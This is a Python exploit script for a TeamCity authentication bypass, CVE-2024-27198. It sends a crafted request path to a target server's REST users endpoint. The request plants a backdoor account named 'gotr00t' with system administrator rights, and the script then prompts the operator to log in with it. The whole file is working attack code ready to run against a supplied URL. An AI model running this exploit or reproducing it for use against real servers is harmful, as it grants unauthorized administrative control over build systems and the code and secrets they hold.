import requests
import argparse
import sys

requests.packages.urllib3.disable_warnings()

banner = r"""
  _______                     _____ _ _         _____          _      _ _   
 |__   __|                   / ____(_) |       |  ___|        | |    (_) |  
    | | ___  __ _ _ __ ___  | |     _| |_ _   _| |____  ___ __| | ___ _| |_ 
    | |/ _ \/ _` | '_ ` _ \ | |    | | __| | | |  __\ \/ / '_ \| / _ \ | __|
    | |  __/ (_| | | | | | || |____| | |_| |_| | |___>  <| |_) | |  __/ | |_ 
    |_|\___|\__,_|_| |_| |_| \_____|_|\__|\__, \____/_/\_\ .__/|_|\___|_|\__|
                                           __/ |         | |                
                                          |___/          |_|                
     
               TeamCity Authentication Bypass (CVE-2024-27198)
               by c0d3ninja
"""

parser = argparse.ArgumentParser(description="TeamCity Authentication Bypass Exploit (CVE-2024-27198)")
parser.add_argument("--url", type=str, required=True, help="Target URL (e.g., http://teamcity:8111)")
args = parser.parse_args()

def exploit_teamcity_vulnerability():
    base_url = args.url.rstrip('/')
    exploit_path = "/idontexist?jsp=/app/rest/users;.jsp"
    full_url = f"{base_url}{exploit_path}"
    
    print(f"[*] Targeting: {full_url}")
    
    headers = {
        "Content-Type": "application/json"
    }
    
    payload = {
        "username": "gotr00t",
        "password": "gotr00t",
        "email": "gotr00t",
        "roles": {
            "role": [{
                "roleId": "SYSTEM_ADMIN",
                "scope": "g"
            }]
        }
    }
    
    try:
        response = requests.post(full_url, headers=headers, verify=False, json=payload)
        
        print(f"Status Code: {response.status_code}")
        print(f"Response Headers: {response.headers}")
        print(f"Response Content: {response.text[:1000]}") # Limiting output length
        
        if response.status_code == 200:
            print("[+] Exploit likely successful!")
            print("[+] Try logging in with username: gotr00t and password: gotr00t")
        else:
            print(f"[-] Exploit may have failed. Status code: {response.status_code}")
            
    except Exception as e:
        print(f"[!] Error occurred: {str(e)}")

if __name__ == "__main__":
    print(f"{banner}\n")
    exploit_teamcity_vulnerability()
    print("[*] Exploit attempt completed")